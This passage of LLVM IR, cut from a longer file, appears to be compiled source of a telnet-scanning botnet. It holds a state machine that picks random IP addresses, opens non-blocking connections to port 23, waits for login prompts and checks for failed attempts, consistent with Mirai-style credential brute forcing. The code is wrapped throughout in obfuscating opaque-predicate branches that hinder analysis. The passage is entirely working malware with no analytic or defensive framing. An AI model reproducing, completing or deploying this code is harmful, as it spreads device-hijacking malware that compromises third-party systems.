  %196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %195
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %196, i32 0, i32 7
  %198 = load i32, i32* %197, align 16
  %199 = icmp eq i32 %198, 0
  br i1 %199, label %200, label %207

; <label>:200:                                    ; preds = %193
  %201 = call i64 @time(i64* null) #3
  %202 = trunc i64 %201 to i32
  %203 = load i32, i32* %5, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %204
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %205, i32 0, i32 7
  store i32 %202, i32* %206, align 16
  br label %207

; <label>:207:                                    ; preds = %200, %193
  %208 = load i32, i32* @x.77
  %209 = load i32, i32* @y.78
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %207
  %216 = load i32, i32* %5, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %217
  %219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %218, i32 0, i32 2
  %220 = load i8, i8* %219, align 8
  %221 = zext i8 %220 to i32
  %222 = load i32, i32* @x.77
  %223 = load i32, i32* @y.78
  %224 = sub i32 %222, 1
  %225 = mul i32 %222, %224
  %226 = urem i32 %225, 2
  %227 = icmp eq i32 %226, 0
  %228 = icmp slt i32 %223, 10
  %229 = or i1 %227, %228
  br i1 %229, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  switch i32 %221, label %1290 [
    i32 0, label %230
    i32 1, label %462
    i32 2, label %641
    i32 3, label %735
    i32 4, label %812
    i32 5, label %874
    i32 6, label %983
    i32 7, label %1131
  ]

; <label>:230:                                    ; preds = %originalBBpart231
  %231 = load i32, i32* %5, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %232
  %234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %233, i32 0, i32 3
  %235 = load i8, i8* %234, align 1
  %236 = zext i8 %235 to i32
  %237 = icmp eq i32 %236, 1
  br i1 %237, label %238, label %258

; <label>:238:                                    ; preds = %230
  %239 = load i32, i32* %5, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %240
  %242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %241, i32 0, i32 9
  %243 = load i8*, i8** %242, align 8
  store i8* %243, i8** %20, align 8
  %244 = load i32, i32* %5, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %245
  %247 = bitcast %struct.telstate_t* %246 to i8*
  call void @llvm.memset.p0i8.i64(i8* %247, i8 0, i64 32, i32 16, i1 false)
  %248 = load i8*, i8** %20, align 8
  %249 = load i32, i32* %5, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %250
  %252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %251, i32 0, i32 9
  store i8* %248, i8** %252, align 8
  %253 = call i32 @GIP()
  %254 = load i32, i32* %5, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %255
  %257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %256, i32 0, i32 1
  store i32 %253, i32* %257, align 4
  br label %354

; <label>:258:                                    ; preds = %230
  %259 = load i32, i32* %5, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %260
  %262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %261, i32 0, i32 3
  %263 = load i8, i8* %262, align 1
  %264 = zext i8 %263 to i32
  %265 = icmp eq i32 %264, 0
  br i1 %265, label %266, label %337

; <label>:266:                                    ; preds = %258
  %267 = load i32, i32* @x.77
  %268 = load i32, i32* @y.78
  %269 = sub i32 %267, 1
  %270 = mul i32 %267, %269
  %271 = urem i32 %270, 2
  %272 = icmp eq i32 %271, 0
  %273 = icmp slt i32 %268, 10
  %274 = or i1 %272, %273
  br i1 %274, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %266
  %275 = load i32, i32* %5, align 4
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %276
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %277, i32 0, i32 5
  %279 = load i8, i8* %278, align 1
  %280 = add i8 %279, 1
  store i8 %280, i8* %278, align 1
  %281 = load i32, i32* %5, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %282
  %284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %283, i32 0, i32 4
  %285 = load i8, i8* %284, align 2
  %286 = add i8 %285, 1
  store i8 %286, i8* %284, align 2
  %287 = load i32, i32* %5, align 4
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %288
  %290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %289, i32 0, i32 5
  %291 = load i8, i8* %290, align 1
  %292 = zext i8 %291 to i64
  %293 = icmp eq i64 %292, 1
  %294 = load i32, i32* @x.77
  %295 = load i32, i32* @y.78
  %296 = sub i32 %294, 1
  %297 = mul i32 %294, %296
  %298 = urem i32 %297, 2
  %299 = icmp eq i32 %298, 0
  %300 = icmp slt i32 %295, 10
  %301 = or i1 %299, %300
  br i1 %301, label %originalBBpart252, label %originalBB33alteredBB

originalBBpart252:                                ; preds = %originalBB33
  br i1 %293, label %302, label %323

; <label>:302:                                    ; preds = %originalBBpart252
  %303 = load i32, i32* @x.77
  %304 = load i32, i32* @y.78
  %305 = sub i32 %303, 1
  %306 = mul i32 %303, %305
  %307 = urem i32 %306, 2
  %308 = icmp eq i32 %307, 0
  %309 = icmp slt i32 %304, 10
  %310 = or i1 %308, %309
  br i1 %310, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %302
  %311 = load i32, i32* %5, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %312
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %313, i32 0, i32 3
  store i8 1, i8* %314, align 1
  %315 = load i32, i32* @x.77
  %316 = load i32, i32* @y.78
  %317 = sub i32 %315, 1
  %318 = mul i32 %315, %317
  %319 = urem i32 %318, 2
  %320 = icmp eq i32 %319, 0
  %321 = icmp slt i32 %316, 10
  %322 = or i1 %320, %321
  br i1 %322, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %1291

; <label>:323:                                    ; preds = %originalBBpart252
  %324 = load i32, i32* %5, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %325
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %326, i32 0, i32 4
  %328 = load i8, i8* %327, align 2
  %329 = zext i8 %328 to i64
  %330 = icmp eq i64 %329, 1
  br i1 %330, label %331, label %336

; <label>:331:                                    ; preds = %323
  %332 = load i32, i32* %5, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %333
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %334, i32 0, i32 3
  store i8 1, i8* %335, align 1
  br label %1291

; <label>:336:                                    ; preds = %323
  br label %337

; <label>:337:                                    ; preds = %336, %258
  %338 = load i32, i32* @x.77
  %339 = load i32, i32* @y.78
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %337
  %346 = load i32, i32* @x.77
  %347 = load i32, i32* @y.78
  %348 = sub i32 %346, 1
  %349 = mul i32 %346, %348
  %350 = urem i32 %349, 2
  %351 = icmp eq i32 %350, 0
  %352 = icmp slt i32 %347, 10
  %353 = or i1 %351, %352
  br i1 %353, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %354

; <label>:354:                                    ; preds = %originalBBpart260, %238
  %355 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %355, align 4
  %356 = call zeroext i16 @htons(i16 zeroext 23) #10
  %357 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %356, i16* %357, align 2
  %358 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %359 = getelementptr inbounds [8 x i8], [8 x i8]* %358, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %359, i8 0, i64 8, i32 4, i1 false)
  %360 = load i32, i32* %5, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %361
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %362, i32 0, i32 1
  %364 = load i32, i32* %363, align 4
  %365 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %366 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %365, i32 0, i32 0
  store i32 %364, i32* %366, align 4
  %367 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %368 = load i32, i32* %5, align 4
  %369 = sext i32 %368 to i64
  %370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %369
  %371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %370, i32 0, i32 0
  store i32 %367, i32* %371, align 16
  %372 = load i32, i32* %5, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %373
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %374, i32 0, i32 0
  %376 = load i32, i32* %375, align 16
  %377 = icmp eq i32 %376, -1
  br i1 %377, label %378, label %395

; <label>:378:                                    ; preds = %354
  %379 = load i32, i32* @x.77
  %380 = load i32, i32* @y.78
  %381 = sub i32 %379, 1
  %382 = mul i32 %379, %381
  %383 = urem i32 %382, 2
  %384 = icmp eq i32 %383, 0
  %385 = icmp slt i32 %380, 10
  %386 = or i1 %384, %385
  br i1 %386, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %378
  %387 = load i32, i32* @x.77
  %388 = load i32, i32* @y.78
  %389 = sub i32 %387, 1
  %390 = mul i32 %387, %389
  %391 = urem i32 %390, 2
  %392 = icmp eq i32 %391, 0
  %393 = icmp slt i32 %388, 10
  %394 = or i1 %392, %393
  br i1 %394, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %1291

; <label>:395:                                    ; preds = %354
  %396 = load i32, i32* %5, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %397
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %398, i32 0, i32 0
  %400 = load i32, i32* %399, align 16
  %401 = load i32, i32* %5, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %402
  %404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %403, i32 0, i32 0
  %405 = load i32, i32* %404, align 16
  %406 = call i32 (i32, i32, ...) @fcntl(i32 %405, i32 3, i8* null)
  %407 = or i32 %406, 2048
  %408 = call i32 (i32, i32, ...) @fcntl(i32 %400, i32 4, i32 %407)
  %409 = load i32, i32* %5, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %410
  %412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %411, i32 0, i32 0
  %413 = load i32, i32* %412, align 16
  %414 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %415 = call i32 @connect(i32 %413, %struct.sockaddr* %414, i32 16)
  %416 = icmp eq i32 %415, -1
  br i1 %416, label %417, label %441

; <label>:417:                                    ; preds = %395
  %418 = call i32* @__errno_location() #10
  %419 = load i32, i32* %418, align 4
  %420 = icmp ne i32 %419, 115
  br i1 %420, label %421, label %441

; <label>:421:                                    ; preds = %417
  %422 = load i32, i32* @x.77
  %423 = load i32, i32* @y.78
  %424 = sub i32 %422, 1
  %425 = mul i32 %422, %424
  %426 = urem i32 %425, 2
  %427 = icmp eq i32 %426, 0
  %428 = icmp slt i32 %423, 10
  %429 = or i1 %427, %428
  br i1 %429, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %421
  %430 = load i32, i32* %5, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %431
  call void @reset_telstate(%struct.telstate_t* %432)
  %433 = load i32, i32* @x.77
  %434 = load i32, i32* @y.78
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br label %461

; <label>:441:                                    ; preds = %417, %395
  %442 = load i32, i32* @x.77
  %443 = load i32, i32* @y.78
  %444 = sub i32 %442, 1
  %445 = mul i32 %442, %444
  %446 = urem i32 %445, 2
  %447 = icmp eq i32 %446, 0
  %448 = icmp slt i32 %443, 10
  %449 = or i1 %447, %448
  br i1 %449, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %441
  %450 = load i32, i32* %5, align 4
  %451 = sext i32 %450 to i64
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %451
  call void @advance_state(%struct.telstate_t* %452, i32 1)
  %453 = load i32, i32* @x.77
  %454 = load i32, i32* @y.78
  %455 = sub i32 %453, 1
  %456 = mul i32 %453, %455
  %457 = urem i32 %456, 2
  %458 = icmp eq i32 %457, 0
  %459 = icmp slt i32 %454, 10
  %460 = or i1 %458, %459
  br i1 %460, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %461

; <label>:461:                                    ; preds = %originalBBpart272, %originalBBpart268
  br label %1290

; <label>:462:                                    ; preds = %originalBBpart231
  %463 = load i32, i32* @x.77
  %464 = load i32, i32* @y.78
  %465 = sub i32 %463, 1
  %466 = mul i32 %463, %465
  %467 = urem i32 %466, 2
  %468 = icmp eq i32 %467, 0
  %469 = icmp slt i32 %464, 10
  %470 = or i1 %468, %469
  br i1 %470, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %462
  %471 = load i32, i32* @x.77
  %472 = load i32, i32* @y.78
  %473 = sub i32 %471, 1
  %474 = mul i32 %471, %473
  %475 = urem i32 %474, 2
  %476 = icmp eq i32 %475, 0
  %477 = icmp slt i32 %472, 10
  %478 = or i1 %476, %477
  br i1 %478, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br label %479

; <label>:479:                                    ; preds = %originalBBpart276
  %480 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %481 = getelementptr inbounds [16 x i64], [16 x i64]* %480, i64 0, i64 0
  %482 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %481) #3, !srcloc !6
  %483 = extractvalue { i64, i64* } %482, 0
  %484 = extractvalue { i64, i64* } %482, 1
  %485 = trunc i64 %483 to i32
  store i32 %485, i32* %21, align 4
  %486 = ptrtoint i64* %484 to i64
  %487 = trunc i64 %486 to i32
  store i32 %487, i32* %22, align 4
  br label %488

; <label>:488:                                    ; preds = %479
  br label %489

; <label>:489:                                    ; preds = %488
  %490 = load i32, i32* @x.77
  %491 = load i32, i32* @y.78
  %492 = sub i32 %490, 1
  %493 = mul i32 %490, %492
  %494 = urem i32 %493, 2
  %495 = icmp eq i32 %494, 0
  %496 = icmp slt i32 %491, 10
  %497 = or i1 %495, %496
  br i1 %497, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %489
  %498 = load i32, i32* %5, align 4
  %499 = sext i32 %498 to i64
  %500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %499
  %501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %500, i32 0, i32 0
  %502 = load i32, i32* %501, align 16
  %503 = srem i32 %502, 64
  %504 = zext i32 %503 to i64
  %505 = shl i64 1, %504
  %506 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %507 = load i32, i32* %5, align 4
  %508 = sext i32 %507 to i64
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %508
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %509, i32 0, i32 0
  %511 = load i32, i32* %510, align 16
  %512 = sdiv i32 %511, 64
  %513 = sext i32 %512 to i64
  %514 = getelementptr inbounds [16 x i64], [16 x i64]* %506, i64 0, i64 %513
  %515 = load i64, i64* %514, align 8
  %516 = or i64 %515, %505
  store i64 %516, i64* %514, align 8
  %517 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %517, align 8
  %518 = load i32, i32* %3, align 4
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %519, i64* %520, align 8
  %521 = load i32, i32* %5, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %522
  %524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %523, i32 0, i32 0
  %525 = load i32, i32* %524, align 16
  %526 = add nsw i32 %525, 1
  %527 = call i32 @select(i32 %526, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %527, i32* %6, align 4
  %528 = load i32, i32* %6, align 4
  %529 = icmp eq i32 %528, 1
  %530 = load i32, i32* @x.77
  %531 = load i32, i32* @y.78
  %532 = sub i32 %530, 1
  %533 = mul i32 %530, %532
  %534 = urem i32 %533, 2
  %535 = icmp eq i32 %534, 0
  %536 = icmp slt i32 %531, 10
  %537 = or i1 %535, %536
  br i1 %537, label %originalBBpart2112, label %originalBB78alteredBB

originalBBpart2112:                               ; preds = %originalBB78
  br i1 %529, label %538, label %602

; <label>:538:                                    ; preds = %originalBBpart2112
  %539 = load i32, i32* @x.77
  %540 = load i32, i32* @y.78
  %541 = sub i32 %539, 1
  %542 = mul i32 %539, %541
  %543 = urem i32 %542, 2
  %544 = icmp eq i32 %543, 0
  %545 = icmp slt i32 %540, 10
  %546 = or i1 %544, %545
  br i1 %546, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %538
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %547 = load i32, i32* %5, align 4
  %548 = sext i32 %547 to i64
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %548
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %549, i32 0, i32 0
  %551 = load i32, i32* %550, align 16
  %552 = bitcast i32* %15 to i8*
  %553 = call i32 @getsockopt(i32 %551, i32 1, i32 4, i8* %552, i32* %14) #3
  %554 = load i32, i32* %15, align 4
  %555 = icmp ne i32 %554, 0
  %556 = load i32, i32* @x.77
  %557 = load i32, i32* @y.78
  %558 = sub i32 %556, 1
  %559 = mul i32 %556, %558
  %560 = urem i32 %559, 2
  %561 = icmp eq i32 %560, 0
  %562 = icmp slt i32 %557, 10
  %563 = or i1 %561, %562
  br i1 %563, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %555, label %564, label %568

; <label>:564:                                    ; preds = %originalBBpart2116
  %565 = load i32, i32* %5, align 4
  %566 = sext i32 %565 to i64
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %566
  call void @reset_telstate(%struct.telstate_t* %567)
  br label %585

; <label>:568:                                    ; preds = %originalBBpart2116
  %569 = load i32, i32* %5, align 4
  %570 = sext i32 %569 to i64
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %570
  %572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %571, i32 0, i32 0
  %573 = load i32, i32* %572, align 16
  %574 = load i32, i32* %5, align 4
  %575 = sext i32 %574 to i64
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %575
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %576, i32 0, i32 0
  %578 = load i32, i32* %577, align 16
  %579 = call i32 (i32, i32, ...) @fcntl(i32 %578, i32 3, i8* null)
  %580 = and i32 %579, -2049
  %581 = call i32 (i32, i32, ...) @fcntl(i32 %573, i32 4, i32 %580)
  %582 = load i32, i32* %5, align 4
  %583 = sext i32 %582 to i64
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %583
  call void @advance_state(%struct.telstate_t* %584, i32 2)
  br label %585

; <label>:585:                                    ; preds = %568, %564
  %586 = load i32, i32* @x.77
  %587 = load i32, i32* @y.78
  %588 = sub i32 %586, 1
  %589 = mul i32 %586, %588
  %590 = urem i32 %589, 2
  %591 = icmp eq i32 %590, 0
  %592 = icmp slt i32 %587, 10
  %593 = or i1 %591, %592
  br i1 %593, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %585
  %594 = load i32, i32* @x.77
  %595 = load i32, i32* @y.78
  %596 = sub i32 %594, 1
  %597 = mul i32 %594, %596
  %598 = urem i32 %597, 2
  %599 = icmp eq i32 %598, 0
  %600 = icmp slt i32 %595, 10
  %601 = or i1 %599, %600
  br i1 %601, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br label %1291

; <label>:602:                                    ; preds = %originalBBpart2112
  %603 = load i32, i32* @x.77
  %604 = load i32, i32* @y.78
  %605 = sub i32 %603, 1
  %606 = mul i32 %603, %605
  %607 = urem i32 %606, 2
  %608 = icmp eq i32 %607, 0
  %609 = icmp slt i32 %604, 10
  %610 = or i1 %608, %609
  br i1 %610, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %602
  %611 = load i32, i32* %6, align 4
  %612 = icmp eq i32 %611, -1
  %613 = load i32, i32* @x.77
  %614 = load i32, i32* @y.78
  %615 = sub i32 %613, 1
  %616 = mul i32 %613, %615
  %617 = urem i32 %616, 2
  %618 = icmp eq i32 %617, 0
  %619 = icmp slt i32 %614, 10
  %620 = or i1 %618, %619
  br i1 %620, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br i1 %612, label %621, label %625

; <label>:621:                                    ; preds = %originalBBpart2124
  %622 = load i32, i32* %5, align 4
  %623 = sext i32 %622 to i64
  %624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %623
  call void @reset_telstate(%struct.telstate_t* %624)
  br label %1291

; <label>:625:                                    ; preds = %originalBBpart2124
  br label %626

; <label>:626:                                    ; preds = %625
  %627 = load i32, i32* %5, align 4
  %628 = sext i32 %627 to i64
  %629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %628
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %629, i32 0, i32 7
  %631 = load i32, i32* %630, align 16
  %632 = add i32 %631, 5
  %633 = zext i32 %632 to i64
  %634 = call i64 @time(i64* null) #3
  %635 = icmp slt i64 %633, %634
  br i1 %635, label %636, label %640

; <label>:636:                                    ; preds = %626
  %637 = load i32, i32* %5, align 4
  %638 = sext i32 %637 to i64
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %638
  call void @reset_telstate(%struct.telstate_t* %639)
  br label %640

; <label>:640:                                    ; preds = %636, %626
  br label %1290

; <label>:641:                                    ; preds = %originalBBpart231
  %642 = load i32, i32* %5, align 4
  %643 = sext i32 %642 to i64
  %644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %643
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %644, i32 0, i32 0
  %646 = load i32, i32* %645, align 16
  %647 = load i32, i32* %3, align 4
  %648 = load i32, i32* %5, align 4
  %649 = sext i32 %648 to i64
  %650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %649
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %650, i32 0, i32 9
  %652 = load i8*, i8** %651, align 8
  %653 = call i32 @read_until_response(i32 %646, i32 %647, i8* %652, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %654 = icmp ne i32 %653, 0
  br i1 %654, label %655, label %704

; <label>:655:                                    ; preds = %641
  %656 = load i32, i32* %5, align 4
  %657 = sext i32 %656 to i64
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %657
  %659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %658, i32 0, i32 9
  %660 = load i8*, i8** %659, align 8
  %661 = call i32 @contains_fail(i8* %660)
  %662 = icmp ne i32 %661, 0
  br i1 %662, label %663, label %683

; <label>:663:                                    ; preds = %655
  %664 = load i32, i32* @x.77
  %665 = load i32, i32* @y.78
  %666 = sub i32 %664, 1
  %667 = mul i32 %664, %666
  %668 = urem i32 %667, 2
  %669 = icmp eq i32 %668, 0
  %670 = icmp slt i32 %665, 10
  %671 = or i1 %669, %670
  br i1 %671, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %663
  %672 = load i32, i32* %5, align 4
  %673 = sext i32 %672 to i64
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %673
  call void @advance_state(%struct.telstate_t* %674, i32 0)
  %675 = load i32, i32* @x.77
  %676 = load i32, i32* @y.78
  %677 = sub i32 %675, 1
  %678 = mul i32 %675, %677
  %679 = urem i32 %678, 2
  %680 = icmp eq i32 %679, 0
  %681 = icmp slt i32 %676, 10
  %682 = or i1 %680, %681
  br i1 %682, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br label %687

; <label>:683:                                    ; preds = %655
  %684 = load i32, i32* %5, align 4
  %685 = sext i32 %684 to i64
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %685
  call void @advance_state(%struct.telstate_t* %686, i32 3)
  br label %687

; <label>:687:                                    ; preds = %683, %originalBBpart2128
  %688 = load i32, i32* @x.77
  %689 = load i32, i32* @y.78
  %690 = sub i32 %688, 1
  %691 = mul i32 %688, %690
  %692 = urem i32 %691, 2
  %693 = icmp eq i32 %692, 0
  %694 = icmp slt i32 %689, 10
  %695 = or i1 %693, %694
  br i1 %695, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %687
  %696 = load i32, i32* @x.77
  %697 = load i32, i32* @y.78
  %698 = sub i32 %696, 1
  %699 = mul i32 %696, %698
  %700 = urem i32 %699, 2
  %701 = icmp eq i32 %700, 0
  %702 = icmp slt i32 %697, 10
  %703 = or i1 %701, %702
  br i1 %703, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br label %1291

; <label>:704:                                    ; preds = %641
  %705 = load i32, i32* @x.77
  %706 = load i32, i32* @y.78
  %707 = sub i32 %705, 1
  %708 = mul i32 %705, %707
  %709 = urem i32 %708, 2
  %710 = icmp eq i32 %709, 0
  %711 = icmp slt i32 %706, 10
  %712 = or i1 %710, %711
  br i1 %712, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %704
  %713 = load i32, i32* %5, align 4
  %714 = sext i32 %713 to i64
  %715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %714
  %716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %715, i32 0, i32 7
  %717 = load i32, i32* %716, align 16
  %718 = add i32 %717, 7
  %719 = zext i32 %718 to i64
  %720 = call i64 @time(i64* null) #3
  %721 = icmp slt i64 %719, %720
  %722 = load i32, i32* @x.77
  %723 = load i32, i32* @y.78
  %724 = sub i32 %722, 1
  %725 = mul i32 %722, %724
  %726 = urem i32 %725, 2
  %727 = icmp eq i32 %726, 0
  %728 = icmp slt i32 %723, 10
  %729 = or i1 %727, %728
  br i1 %729, label %originalBBpart2140, label %originalBB134alteredBB

originalBBpart2140:                               ; preds = %originalBB134
  br i1 %721, label %730, label %734

; <label>:730:                                    ; preds = %originalBBpart2140
